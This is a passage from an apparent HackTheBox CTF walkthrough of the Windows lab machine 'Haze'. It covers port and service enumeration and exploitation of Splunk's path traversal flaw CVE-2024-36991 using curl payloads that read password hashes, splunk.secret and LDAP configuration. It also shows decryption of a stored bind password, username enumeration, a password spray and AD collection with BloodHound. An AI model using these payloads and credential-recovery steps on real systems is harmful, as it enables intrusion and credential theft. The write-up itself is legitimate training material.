56142/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56207/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h37m12s
| smb2-time: 
|   date: 2025-07-05T20:42:59
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46282/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12409/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 26877/udp): CLEAN (Timeout)
|   Check 4 (port 13305/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  5 21:05:59 2025 -- 1 IP address (1 host up) scanned in 135.21 seconds
```


## 389 - Ldap


### Naming contexts

Requesting  `namingcontexts` from base

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ ldapsearch -H "ldap://$(pt get rhost)" -x -s base namingcontexts | tee enum/ldapsearch_namingcontexts.txt
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=haze,DC=htb
namingcontexts: CN=Configuration,DC=haze,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=haze,DC=htb
namingcontexts: DC=DomainDnsZones,DC=haze,DC=htb
namingcontexts: DC=ForestDnsZones,DC=haze,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

### Anonymous binding

Check if anonymous binding is enabled while enumerating user objects

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ BASE="$(cat enum/ldapsearch_namingcontexts.txt | grep 'namingcontexts:' | head -n +1 | awk -F': ' '{print $2}')"; ldapsearch -H "ldap://$(pt get rhost)" -x -b "${BASE}" '(objectClass=user)' | tee enum/ldapsearch_users.txt
# extended LDIF
#
# LDAPv3
# base <DC=haze,DC=htb> with scope subtree
# filter: (objectClass=user)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CAF, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```


## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ nxc smb $(pt get rhost) -u '' -p ''
nxc smb $(pt get rhost) -u 'a' -p ''
nxc smb $(pt get rhost) -u 'Guest' -p ''
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\:
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\a: STATUS_LOGON_FAILURE
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\Guest: STATUS_ACCOUNT_DISABLED
```


### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ nxc smb $(pt get rhost) -u '' -p '' --shares
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\:
SMB         10.10.11.61     445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```


### Groups & Users

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ /opt/sectools/ad/enum4linux-ng/enum4linux-ng.py -oA enum/enum4linux -R 1000 -r '500-1000,1000-5000' -U -G -Gm -C -P -L -I -N $(pt get rhost) -u '' -p ''
ENUM4LINUX - next generation (v1.3.4)
[...]
 ====================================================
|    Domain Information via RPC for DC01.haze.htb    |
 ====================================================
[+] Domain: HAZE
[+] Domain SID: S-1-5-21-323145914-28650650-2368316563
[+] Membership: domain member
[...]
 ===================================================================
|    Users, Groups and Machines on DC01.haze.htb via RID Cycling    |
 ===================================================================
[*] Trying SID S-1-5-21-323145914-28650650-2368316563
[-] Could not find any (new) users, (new) groups or (new) machines
[...]
```


## 8000 - HTTP : Splunkd


### Info

```ruby
http://10.10.11.61:8000 [303,303,200] [Splunkd] [http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F] [f5e6ed05a1b96632d3f77f3dd2b65b32497535cc] [Splunkd]
```

![](/assets/obsidian/53470ba8c37f5eeec8303b51343462df.png)

### Directory

```ruby
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ URL="http://$(pt get rhost):8000"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w /usr/share/dirb/wordlists/common.txt --collect-words --collect-backups --collect-extensions --scan-dir-listings -C 400,404,500 -r -n -u "$URL" -o "ferox_${OUT}_common.txt"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://DC01.haze.htb:8000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirb/wordlists/common.txt
 💢  Status Code Filters   │ [400, 404, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_DC01.haze.htb-8000_common.txt
 📂  Scan Dir Listings     │ true
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET      237l     3072w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      162l      685w    13512c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2Faccount%2F
200      GET      162l      685w    13512c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2Fmanager%2F
200      GET        1l       40w      647c http://dc01.haze.htb:8000/en-US/config
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/de-DE/account/login?return_to=%2Fde_DE%2F
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen_us%2F
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen_US%2F
200      GET       40l      160w    41992c http://dc01.haze.htb:8000/en-US/favicon.ico
200      GET       41l      148w     2963c http://dc01.haze.htb:8000/en-US/embed
200      GET      193l      545w     7417c http://dc01.haze.htb:8000/en-US/help
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/fr-FR/account/login?return_to=%2Ffr_FR%2F
200      GET      162l      685w    13512c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2Findex
200      GET      162l      685w    13512c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2Finfo
200      GET      162l      685w    13512c http://dc01.haze.htb:8000/it-IT/account/login?return_to=%2Fit_IT%2F
200      GET        1l        6w       30c http://dc01.haze.htb:8000/en-US/lists
200      GET      162l      685w    13512c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2Fmanager%2Fsystem%2Flicensing%2Fswitch%3Freturn_to%3DNone
200      GET      162l      685w    13512c http://dc01.haze.htb:8000/en-US/account/login
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/ko-KR/account/login?return_to=%2Fko_KR%2F
200      GET      162l      685w    13512c http://dc01.haze.htb:8000/ja-JP/account/login?return_to=%2Fja_JP%2F
200      GET      162l      685w    13512c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2Fmodules
200      GET        2l        4w       26c http://dc01.haze.htb:8000/robots.txt
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2Ftree
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/zh-CN/account/login?return_to=%2Fzh-cn%2F
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/zh-TW/account/login?return_to=%2Fzh-tw%2F
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/zh-CN/account/login?return_to=%2Fzh_CN%2F
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/zh-TW/account/login?return_to=%2Fzh_TW%2F
200      GET      162l      685w    13513c http://dc01.haze.htb:8000/en-US/account/login?return_to=%2Fen-us%2F
[####################] - 59s     6920/6920    0s      found:27      errors:0
[####################] - 58s     6438/6438    111/s   http://DC01.haze.htb:8000/ 
```


## 8089 - HTTP : Splunk 9.2.1


### Info

```ruby
https://10.10.11.61:8089 [200] [Splunkd] [0255db7087b5d0fd9b100bb0fedf48508a82deb5] [Splunkd]
```

![](/assets/obsidian/66d8ac349528f774318eb2869dc290f2.png)

### Directory

```ruby
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ URL="https://$(pt get rhost):8089"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w /usr/share/dirb/wordlists/common.txt --collect-words --collect-backups --collect-extensions --scan-dir-listings -C 400,404,500 -r -n -u "$URL" -o "ferox_${OUT}_common.txt"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://DC01.haze.htb:8089
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirb/wordlists/common.txt
 💢  Status Code Filters   │ [400, 404, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_DC01.haze.htb-8089_common.txt
 📂  Scan Dir Listings     │ true
 💰  Collect Extensions    │ true
 💸  Ignored Extensions    │ [Images, Movies, Audio, etc...]
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l       16w      223c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401      GET        6l        9w      130c https://dc01.haze.htb:8089/servicesNS
200      GET      258l      576w     8644c https://dc01.haze.htb:8089/static/atom.xsl
401      GET        6l        9w      130c https://dc01.haze.htb:8089/services
200      GET       36l      533w     2183c https://dc01.haze.htb:8089/
200      GET        2l        4w       26c https://dc01.haze.htb:8089/robots.txt
200      GET       36l      533w     2183c https://dc01.haze.htb:8089/v1
200      GET       36l      533w     2183c https://dc01.haze.htb:8089/v1.1
200      GET       36l      533w     2183c https://dc01.haze.htb:8089/v2
200      GET       36l      533w     2183c https://dc01.haze.htb:8089/v2.1
200      GET       36l      533w     2183c https://dc01.haze.htb:8089/v4
200      GET       36l      533w     2183c https://dc01.haze.htb:8089/v4.1
200      GET       36l      533w     2183c https://dc01.haze.htb:8089/v3
200      GET       36l      533w     2183c https://dc01.haze.htb:8089/v3.1
[####################] - 33s    15020/15020   0s      found:13      errors:3
[####################] - 33s    14962/14962   459/s   https://DC01.haze.htb:8089/ 
```


# User Flag
---

## Auth as paul.taylor


### Setup AD environment

Get **Domain name** and **Domain Controller** name -> Add to `/etc/hosts` -> Generate kerberos config

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ nxc smb $(pt get ip) --generate-hosts-file .pt/hosts && cat .pt/hosts | sudo tee -a /etc/hosts && sudo ~/scripts/ad/sync_ntp.sh $(pt get ip) && pt set rhost `cat .pt/hosts | awk '{print $2}' | tail -n1` && pt set domain `cat .pt/hosts | awk '{print $3}' | tail -n1` && nxc smb -k $(pt get rhost) --generate-krb5-file .pt/krb5.conf && sudo cp .pt/krb5.conf /etc/krb5.conf
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
10.10.11.61     DC01.haze.htb haze.htb DC01
[*] Disable virtualbox's auto time sync
-> sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.

[*] Stop systemd-timesyncd to sync Time manually
-> sudo systemctl stop systemd-timesyncd

[*] Disable system time sync
-> sudo systemctl disable --now chronyd
Failed to disable unit: Unit chronyd.service does not exist

[*] Sync time with NTP server
-> sudo ntpdate -u $1
2025-07-06 06:02:51.661363 (+0800) -0.039641 +/- 0.125382 10.10.11.61 s1 no-leap

Done syncing time with NTP server: 10.10.11.61
SMB         DC01.haze.htb   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ cat /etc/krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = HAZE.HTB

[realms]
    HAZE.HTB = {
        kdc = dc01.haze.htb
        admin_server = dc01.haze.htb
        default_domain = haze.htb
    }

[domain_realm]
    .haze.htb = HAZE.HTB
    haze.htb = HAZE.HTB
```


### 8000 - Spunk 9.2.1 : Directory Traversal (CVE-2024-36991)

- Google : `Splunk build: 9.2.1 exploit`

> POC - https://github.com/jaytiwari05/CVE-2024-36991

> **CVE-2024-36991**
> 
> In Splunk Enterprise on Windows versions below **9.2.2**, **9.1.5**, and **9.0.10**, an attacker could perform a path traversal on the `/modules/messaging/` endpoint in Splunk Enterprise on Windows. This vulnerability should only affect Splunk Enterprise on Windows.
{: .prompt-info }

```bash
cd exploit
git clone https://github.com/jaytiwari05/CVE-2024-36991
cd CVE-2024-36991
```

The POC provided some options that can grab interesting files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze/exploit/CVE-2024-36991]
└─$ python exploit.py -u http://10.10.11.61:8000

  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _
 / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
 \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|


CVE-2024-36991
Made by ~PaiN05


Available sections:
1. Credentials & Secrets 🔱
2. Configuration Files 🔥
3. Logs & History [Might Get Freeze] 💀
4. System & Service Files [Might Get Freeze] 💀
5. Apps & Custom Scripts 🔥
usage: exploit.py [-h] -u URL -s SECTION
exploit.py: error: the following arguments are required: -s/--section
```

1. Gather credentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze/exploit/CVE-2024-36991]
└─$ python exploit.py -u http://10.10.11.61:8000 -s 1

  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _
 / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
 \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|


CVE-2024-36991
Made by ~PaiN05


Available sections:
1. Credentials & Secrets 🔱
2. Configuration Files 🔥
3. Logs & History [Might Get Freeze] 💀
4. System & Service Files [Might Get Freeze] 💀
5. Apps & Custom Scripts 🔥

[+] Running section 1

[*] Running: curl -s "http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/passwd"
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152


[*] Running: curl -s "http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret"
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD

[*] Running: curl -s "http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/server.pem"
	-----BEGIN CERTIFICATE-----
MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
[...]


[*] Running: curl -s "http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/var/run/splunk/session"
[...]
                <p data-role="error-message">Page not found! Click <a href="/" data-role="return-to-splunk-home">here</a> to return to Splunk homepage.</p>
[...]


[*] Running: curl -s "http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/authentication.conf"
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP
```

2. Check config files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze/exploit/CVE-2024-36991]
└─$ python exploit.py -u http://10.10.11.61:8000 -s 2

  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _
 / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
 \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|


CVE-2024-36991
Made by ~PaiN05


Available sections:
1. Credentials & Secrets 🔱
2. Configuration Files 🔥
3. Logs & History [Might Get Freeze] 💀
4. System & Service Files [Might Get Freeze] 💀
5. Apps & Custom Scripts 🔥

[+] Running section 2

[*] Running: curl -s "http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/web.conf"
[...]
                <p data-role="error-message">Page not found! Click <a href="/" data-role="return-to-splunk-home">here</a> to return to Splunk homepage.</p>
[...]
[*] Running: curl -s "http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/inputs.conf"
[...]
                <p data-role="error-message">Page not found! Click <a href="/" data-role="return-to-splunk-home">here</a> to return to Splunk homepage.</p>
[...]
```


### Decrypt splunk 7.2 secrets

- Google : `splunk $7$ hash`

There's a tool **splunksecrets** that can decrypt Splunk 7.2 **AES256-GCM** secrets (`$7$<base64 ciphertext>`) via the encryption key from `etc/auth/splunk.secret`

![](/assets/obsidian/cd56195f5af8007b549cb127fdb8093b.png)

Install **splunksecrets**

```bash
uv tool install splunksecrets
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ splunksecrets
Usage: splunksecrets [OPTIONS] COMMAND [ARGS]...

Options:
  --help  Show this message and exit.

Commands:
  dbconnect-decrypt         Decrypt password used for dbconnect identity
  dbconnect-encrypt         Encrypt password used for dbconnect identity
  dbconnect-legacy-encrypt  Encrypt password used for dbconnect identity...
  phantom-decrypt           Decrypt password used for Phantom asset
  phantom-encrypt           Encrypt password used for Phantom asset
  splunk-decrypt            Decrypt password using Splunk 7.2 algorithm
  splunk-encrypt            Encrypt password using Splunk 7.2 algorithm
  splunk-hash-passwd        Generate password hash for use in...
  splunk-legacy-decrypt     Decrypt password using legacy Splunk...
  splunk-legacy-encrypt     Encrypt password using legacy Splunk...
```

Decrypt `Paul Taylor`'s `bindDNpassword` from `etc/system/local/authentication.conf`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ splunksecrets splunk-decrypt -S <(echo 'NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD') --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
Ld@p_Auth_Sp1unk@2k24
```


### (Failed) 8000 - Spunk 9.2.1 : Password spray

> http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ curl -s "http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/passwd" > loot/8000/passwd

┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ cat loot/8000/passwd | awk -F: '{print $2}' | tee users_spunk.lst
admin
edward
mark
paul
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ ffuf -c --request-proto http -request login_8000.req -w users_spunk.lst

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.61:8000/en-US/account/login
 :: Wordlist         : FUZZ: /home/kali/htb/Haze/users_spunk.lst
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Header           : X-Requested-With: XMLHttpRequest
 :: Header           : Connection: keep-alive
 :: Header           : Cookie: cval=1243458601; splunkweb_uid=5CA3406E-3FCB-4929-BC34-E767D7AF8527; splunkweb_uid=5CA3406E-3FCB-4929-BC34-E767D7AF8527; session_id_8000=13c92d5f4601528ca433eebf0c39896448d7c128
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Origin: http://10.10.11.61:8000
 :: Header           : DNT: 1
 :: Header           : Sec-GPC: 1
 :: Header           : Priority: u=0
 :: Header           : Host: 10.10.11.61:8000
 :: Header           : Accept: text/javascript, text/html, application/xml, text/xml, */*
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Referer: http://10.10.11.61:8000/
 :: Data             : cval=1243458601&username=FUZZ&password=Ld%40p_Auth_Sp1unk%402k24&return_to=%2Fen-US%2F
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 401, Size: 77, Words: 2, Lines: 1, Duration: 140ms]
paul                    [Status: 401, Size: 77, Words: 2, Lines: 1, Duration: 202ms]
mark                    [Status: 401, Size: 77, Words: 2, Lines: 1, Duration: 265ms]
edward                  [Status: 401, Size: 77, Words: 2, Lines: 1, Duration: 327ms]
:: Progress: [4/4] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```


### 88 - Kerberos : Username validation

Generate possible AD usernames based on `Paul Taylor`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ /opt/sectools/misc/username-anarchy/username-anarchy -i <(echo 'Paul Taylor') | tee usernames.txt
paul
paultaylor
paul.taylor
paultayl
pault
p.taylor
ptaylor
tpaul
t.paul
taylorp
taylor
taylor.p
taylor.paul
pt
```

Find a valid username

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ kerbrute userenum -d $(pt get domain) --dc $(pt get dc_fqdn) usernames.txt -o kerbrute.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/06/25 - Ronnie Flathers @ropnop

2025/07/06 23:57:22 >  Using KDC(s):
2025/07/06 23:57:22 >   DC01.haze.htb:88

2025/07/06 23:57:22 >  [+] VALID USERNAME:       paul.taylor@haze.htb
2025/07/06 23:57:22 >  Done! Tested 14 usernames (1 valid) in 0.182 seconds
```


### 88 - Kerberos : Credential validation

Check if the credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ nxc smb $(pt get rhost) -k -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24'
SMB         DC01.haze.htb   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         DC01.haze.htb   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ creds-set 'paul.taylor' 'Ld@p_Auth_Sp1unk@2k24'
[+] Password set for user paul.taylor
```


## Shell as mark.adams


### Domain Enumeration


#### Bloodhound

Run collectors

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bloodhound-ce-python -d "$(pt get domain)" -ns $(pt get ip) -c all --zip -u "$(pt get user)" -p "$(pt get pass)"
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 3 users
INFO: Found 32 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 18 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.61:445)] timed out
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.61:445)] timed out
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.61:445)] timed out
INFO: Done in 00M 19S
INFO: Compressing output into 20250707074546_bloodhound.zip
```

Start bloodhound

```bash
sudo docker-compose -f /opt/sectools/ad/bloodhound-ce/docker-compose.yml up
```


#### bhcli

Upload the latest collected data data

```bash
┌──(bravosec㉿fsociety)-[~/htb/Haze]
└─$ bhcli upload `ls -t *.zip | head -1`
INFO: Starting new file upload job...
